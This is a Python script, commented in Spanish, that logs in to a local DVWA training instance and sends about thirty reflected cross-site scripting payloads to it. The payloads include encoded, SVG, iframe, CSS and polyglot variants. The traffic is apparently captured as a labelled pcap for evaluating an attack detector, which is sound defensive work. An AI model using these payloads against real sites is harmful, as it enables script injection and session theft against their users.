import requests
import time
import random

BASE_URL = "http://192.168.20.10"
LOGIN_URL = f"{BASE_URL}/login.php"
CREDENCIALES = {"username": "admin", "password": "password", "Login": "Login"}
PAUSA = 0.5

# DISTINTOS a todos los scripts XSS anteriores
PAYLOADS_XSS_EVAL_HIGH = [
    # Variantes de encoding distintas
    "&#x3C;svg&#x20;onload&#x3D;alert(1)&#x3E;",
    "&#x3C;img&#x20;src&#x3D;x&#x20;onerror&#x3D;alert(1)&#x3E;",
    "&#60;body&#32;onload&#61;alert(1)&#62;",
    "%3Csvg%20onload%3Dalert(1)%3E",
    "%3Cimg%20src%3Dx%20onerror%3Dalert(2)%3E",
    # SVG variantes distintas al entrenamiento
    "<svg xmlns='http://www.w3.org/2000/svg' onload='alert(2)'>",
    "<svg><use href='data:image/svg+xml,<svg id=\"x\" xmlns=\"http://www.w3.org/2000/svg\"><script>alert(1)</script></svg>#x'/>",
    "<svg><animate attributeName=href values=javascript:alert(1) />",
    "<svg><set attributeName=href to=javascript:alert(1)>",
    # Template distintos
    "<script>alert`2`</script>",
    "<script>alert`3`</script>",
    "<script>alert`eval`</script>",
    # Data URI distintos
    "<iframe src='data:text/html,<script>alert(2)</script>'>",
    "<object data='data:text/html,<img src=x onerror=alert(1)>'>",
    # CSS distintos
    "<style>*{color:red;background:url(javascript:alert(2))}</style>",
    "<div style='color:red;background-image:url(javascript:alert(2))'>x</div>",
    # Mutation distintos
    "<table><tbody><tr><td><form><math><mtext></td></tr></tbody></table></form><img src=x onerror=alert(1)>",
    # Srcdoc distintos
    "<iframe srcdoc='<script>alert(2)</script>'>",
    "<iframe srcdoc='<img src=x onerror=alert(2)>'>",
    # Polyglot distintos
    "'\"><svg/onload=alert(2)>",
    "\"><img src=x onerror=alert(2)>",
    "';alert(2)//",
    "\";alert(2)//",
    # Eventos menos comunes distintos
    "<body onbeforeprint=alert(1)>",
    "<body onafterprint=alert(1)>",
    "<body onbeforeunload=alert(1)>",
    "<body onunload=alert(1)>",
    "<body onoffline=alert(1)>",
    "<body ononline=alert(1)>",
    "<body onstorage=alert(1)>",
]

def login(session):
    r = session.get(LOGIN_URL)
    token = None
    for line in r.text.split('\n'):
        if 'user_token' in line and 'value' in line:
            try:
                token = line.split('value=')[1].split("'")[1]
                break
            except:
                pass
    if token:
        CREDENCIALES['user_token'] = token
    r = session.post(LOGIN_URL, data=CREDENCIALES)
    if "Login failed" in r.text:
        print("ERROR: No se pudo hacer login en DVWA")
        return False
    print("Login correcto en DVWA")
    return True

def ataque_xss_eval_high(session):
    print("\n[*] Iniciando ataques XSS HIGH (evaluacion)...")
    payloads = PAYLOADS_XSS_EVAL_HIGH.copy()
    random.shuffle(payloads)
    ok = 0
    for payload in payloads:
        try:
            r = session.get(f"{BASE_URL}/vulnerabilities/xss_r/",
                            params={"name": payload})
            print(f"  XSS_EVAL_H | {payload[:45]:<45} | status: {r.status_code}")
            ok += 1
            time.sleep(PAUSA)
        except Exception as e:
            print(f"  ERROR: {e}")
    print(f"[+] XSS High evaluacion completado: {ok}/{len(payloads)} peticiones")

if __name__ == "__main__":
    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
    print("="*60)
    print("  EVALUACION: XSS REFLECTED — NIVEL HIGH")
    print("  Etiqueta real: 'xss'")
    print("  !! NO subir el pcap a Elasticsearch !!")
    print("  Guardarlo como: evaluacion_xss_high.pcap")
    print("  AVISO: Asegurate de que DVWA esta en nivel HIGH")
    print("="*60)
    input("\nPulsa ENTER cuando tcpdump este corriendo...")
    if not login(session):
        exit(1)
    ataque_xss_eval_high(session)
    print("\n" + "="*60)
    print("  COMPLETADO. Guarda el pcap como: evaluacion_xss_high.pcap")
    print("="*60)
